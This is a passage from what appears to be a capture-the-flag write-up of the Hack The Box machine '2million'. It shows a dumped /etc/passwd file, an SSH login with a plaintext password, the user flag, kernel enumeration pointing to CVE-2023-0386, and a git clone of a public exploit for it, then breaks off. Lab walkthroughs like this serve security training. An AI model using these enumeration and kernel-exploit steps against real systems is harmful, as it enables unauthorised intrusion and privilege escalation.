proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false

```

```
ssh admin@2million.htb
SuperDuperPass123

admin@2million:~$ cat user.txt 
b6f583f75087f47958a041b8a668e9b7

```

**Escelation

```
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```
--> Quick google search we can determine the CVE name "**[CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)**"

*Enumeration*

```
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

admin@2million:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Release:        22.04
Codename:       jammy

```

--> We see that the kernal version is 5.15.70, and using jammy release

git clone https://github.com/xkaneiki/CVE-2023-0386
